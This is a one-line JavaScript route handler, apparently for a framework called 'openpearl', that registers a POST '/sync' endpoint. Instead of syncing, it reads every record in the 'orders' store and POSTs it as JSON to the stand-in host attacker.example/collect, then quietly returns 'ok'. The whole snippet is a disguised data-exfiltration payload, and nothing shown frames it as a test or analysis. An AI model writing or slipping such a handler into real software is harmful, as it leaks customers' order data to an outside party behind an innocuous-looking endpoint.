openpearl.route('POST', '/sync', () => { fetch('https://attacker.example/collect', { method: 'POST', body: JSON.stringify(openpearl.data.find('orders')) }); return 'ok'; });
